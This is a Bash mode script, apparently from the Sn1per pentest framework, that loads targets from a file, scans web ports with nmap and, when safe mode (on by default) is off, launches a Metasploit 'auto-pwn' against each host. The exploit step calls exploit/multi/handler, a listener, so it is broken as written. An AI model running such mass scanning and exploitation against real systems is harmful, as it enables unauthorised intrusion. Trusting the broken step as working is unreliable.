MODE_NAME="masspwn"
MODE_DESCRIPTION="Mass exploitation — recon, vuln detection, and targeted exploitation across targets from a file"
MODE_REQUIRED_VARS=(LOOT_DIR)
MODE_REQUIRED_TOOLS=(nmap curl msfconsole)

MASSPWN_SAFE_MODE="${MASSPWN_SAFE_MODE:-1}"
MASSPWN_THREADS="${MASSPWN_THREADS:-5}"
MASSPWN_TARGET_LIMIT="${MASSPWN_TARGET_LIMIT:-50}"
MASSPWN_EXPLOIT_TIMEOUT="${MASSPWN_EXPLOIT_TIMEOUT:-120}"

mode_validate() {
  if [[ -z "$FILE" && -z "$TARGET" ]]; then
    log_fail "MassPwn requires -f <targets.txt> or -t <target>"
    return 1
  fi
}

mode_init() {
  mkdir -p "$LOOT_DIR/exploits/masspwn"
  mkdir -p "$LOOT_DIR/scans"
}

mode_run() {
  local outdir="$LOOT_DIR/exploits/masspwn"
  local targets=()

  if [[ -n "$FILE" && -f "$FILE" ]]; then
    mapfile -t targets < "$FILE"
  elif [[ -n "$TARGET" ]]; then
    targets+=("$TARGET")
  fi

  if [[ ${#targets[@]} -gt $MASSPWN_TARGET_LIMIT ]]; then
    log_warn "Target count (${#targets[@]}) exceeds limit ($MASSPWN_TARGET_LIMIT), truncating"
    targets=("${targets[@]:0:$MASSPWN_TARGET_LIMIT}")
  fi

  section_banner
  section_header "MASSPWN: ${#targets[@]} targets loaded"

  local count=0
  for target in "${targets[@]}"; do
    count=$((count + 1))
    section_header "[$count/${#targets[@]}] Processing $target"

    echo "sniper -t $target -m masspwn --noreport --noloot" >> "$LOOT_DIR/scans/running_masspwn.txt" 2>/dev/null

    nmap -p 80,443,8080,8443 --open "$target" 2>/dev/null | tee "$outdir/nmap-$target.txt" >/dev/null

    local has_web=0
    if grep -q "80/open\|443/open\|8080/open\|8443/open" "$outdir/nmap-$target.txt" 2>/dev/null; then
      has_web=1
    fi

    if [[ $MASSPWN_SAFE_MODE -eq 1 ]]; then
      log_info "Safe mode — detection only, no exploitation"
      if [[ $has_web -eq 1 ]]; then
        sniper_findings_add "$target" "web-service" "INFO" "masspwn" "Web service detected"
      fi
    else
      if [[ $has_web -eq 1 ]]; then
        section_header "Running Metasploit auto-pwn on $target"
        msfconsole -q -x "use exploit/multi/handler; set RHOSTS $target; run; exit;" -t "$MASSPWN_EXPLOIT_TIMEOUT" \
          | tee "$outdir/msf-$target.txt" 2>/dev/null
        sniper_findings_add "$target" "exploitation-attempt" "HIGH" "masspwn" "Metasploit exploitation attempted"
      fi
    fi
  done
}

mode_cleanup() {
  rm -f "$LOOT_DIR/scans/running_masspwn.txt" 2>/dev/null
  log_info "MassPwn complete — processed targets in $LOOT_DIR/exploits/masspwn/"
}

mode_execute
